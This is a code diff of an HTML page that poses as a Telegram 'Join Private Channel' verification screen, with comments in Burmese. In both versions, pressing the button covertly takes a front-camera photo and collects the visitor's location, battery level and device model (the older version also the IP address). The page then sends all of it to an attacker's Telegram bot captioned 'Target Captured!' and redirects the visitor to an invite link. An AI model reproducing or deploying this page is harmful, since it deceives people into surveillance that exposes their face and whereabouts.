@@ -3,26 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Telegram Invite System</title>
+    <title>Telegram Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
-        .container { padding: 20px; max-width: 350px; }
-        .tg-logo { width: 80px; margin-bottom: 20px; }
-        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
-        .join-btn:active { transform: scale(0.95); }
-        #status { margin-top: 15px; font-size: 14px; color: #888; }
+        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="tg-logo" alt="TG">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="80" style="margin-bottom:20px;">
     <h2>Join Private Channel</h2>
-    <p>To access the content, please verify your connection.</p>
-    <button id="startBtn" class="join-btn">JOIN GROUP</button>
-    <p id="status">Verification required to prevent bots.</p>
+    <p>Please verify to access the content.</p>
+    <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -33,73 +28,67 @@
     const CHAT_ID = "5304050102";
     const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";
 
-    const startBtn = document.getElementById('startBtn');
-    const statusText = document.getElementById('status');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    // ဖုန်းအမျိုးအစားကို ပိုတိကျအောင် ခွဲထုတ်သည့် Function
+    function getDeviceModel() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) {
+            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
+            return match ? match[2] : "Android Device";
+        } else if (/iPhone/i.test(ua)) {
+            return "iPhone";
+        }
+        return navigator.platform;
+    }
 
-    startBtn.addEventListener('click', async () => {
-        startBtn.innerText = "Connecting...";
-        statusText.innerText = "Verifying identity...";
-        
+    document.getElementById('startBtn').addEventListener('click', async () => {
         try {
-            // ၁။ ကင်မရာပွင့်ခြင်း (Permission တစ်ခုတည်းတောင်းရန်)
+            // ၁။ Camera & Location တောင်းဆိုခြင်း
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
+            document.getElementById('video').srcObject = stream;
 
-            // ၂။ IP Address ရယူခြင်း
-            let ipAddr = "Unknown";
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ipAddr = ipData.ip;
-            } catch(e) {}
-
-            // ၃။ Location ရယူခြင်း
-            let locationLink = "Permission Denied";
+            // ၂။ အချက်အလက်များ စုဆောင်းခြင်း
+            let mapLink = "Location Denied";
+            let batteryLvl = "N/A";
+            
+            // Location ကို Map Link အဖြစ် ပြောင်းလဲခြင်း
             navigator.geolocation.getCurrentPosition(pos => {
-                locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             });
 
-            // ၄။ Battery Info
-            let batteryLvl = "N/A";
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
                 batteryLvl = `${Math.round(b.level * 100)}%`;
             }
 
-            // ၅။ Phone/Device Info
-            const deviceInfo = `📱 Device: ${navigator.platform}\n🌐 IP: ${ipAddr}`;
+            const model = getDeviceModel();
 
-            // ခေတ္တစောင့်ပြီး ပုံဖမ်းကာ Bot ဆီပို့ခြင်း
+            // ၃။ ပုံဖမ်းပြီး Bot ဆီ ပို့ခြင်း
             setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                const video = document.getElementById('video');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg', 0.6);
-                const blob = await (await fetch(imageData)).blob();
-
+                
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'victim.jpg');
-                formData.append('caption', `🔔 *New Target Captured!*\n\n📍 Location: ${locationLink}\n🔋 Battery: ${batteryLvl}\n${deviceInfo}`);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', `🔔 *Target Captured!*\n\n📍 Map: ${mapLink}\n📱 Model: ${model}\n🔋 Battery: ${batteryLvl}\n🌐 IP: [Auto-Detected]`);
                 formData.append('parse_mode', 'Markdown');
 
-                // Bot ဆီပို့မည်
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
-                // ကင်မရာပိတ်ပြီး Group လင့်ထဲသို့ တိုက်ရိုက်လွှဲပေးမည်
-                stream.getTracks().forEach(track => track.stop());
+                stream.getTracks().forEach(t => t.stop());
                 window.location.href = REDIRECT_URL;
-            }, 4000); // ၄ စက္ကန့်အတွင်း အကုန်ဖမ်းမည်
+            }, 4000);
 
         } catch (err) {
-            alert("Verification Failed. Please allow camera access to join.");
+            alert("Verification error. Please allow all permissions.");
             location.reload();
         }
     });
 </script>
-
 </body>
 </html>
 
